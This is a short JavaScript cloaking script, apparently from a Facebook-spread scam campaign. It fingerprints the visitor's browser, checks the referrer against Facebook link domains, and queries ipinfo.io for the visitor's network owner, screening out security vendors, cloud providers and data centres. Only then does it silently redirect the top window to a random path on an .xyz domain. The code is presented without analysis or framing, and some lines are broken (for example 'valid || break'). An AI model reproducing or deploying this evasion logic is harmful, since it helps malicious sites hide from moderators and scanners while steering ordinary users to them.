var valid = !isChromium();
var bannedrefs = ['l.facebook.com/l.php','facebook.com/lsr.php','fb.me'];
var bannedorgs = ['facebook','kaspersy','mcafee','amazon','microsoft corporation','digital ocean','incorporated','inc.','radore','netvision','veri merkezi','data center','mcafee'];
var referrer = document.referrer.toLowerCase();
var org = "";

function isChromium(){
  if(!navigator || !navigator.plugins || navigator.plugins.length == 0){
    return false;
  }

  for(var i=0;i<navigator.plugins.length;i++){
    if(navigator.plugins[i].name.indexOf('Chromium') >= 0){
      return true;
      break;
    }
  }
}

function checkRef(){
	if(valid == true){
		for(var i=0;i<bannedrefs.length;i++){
			valid = referrer.indexOf(bannedrefs[i]) > 0;
			valid || break;
		}
		if(valid == true){
			getOrg();
		}
	}
}

function getOrg(){
	var xhr = new XMLHttpRequest();
	xhr.open("GET","http://ipinfo.io/org");
	xhr.send();
	xhr.onreadystatechange = function(){
		if(xhr.readyState == 4 && xhr.status == 200){
			org = xhr.responseText.toLowerCase();
			checkOrg();
		}
	}
}

function checkOrg(){
	if(valid == true){
		for(var i=0;i<bannedorgs.length;i++){
			valid = org.indexOf(bannedorgs[i]) > 0;
			valid || break;
		}
		if(valid == true){
			goSite();
		}
	}
}

function goSite(){
	top.location.href = "http://isuvijulub.xyz/"+rastgele(15);
}

function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}
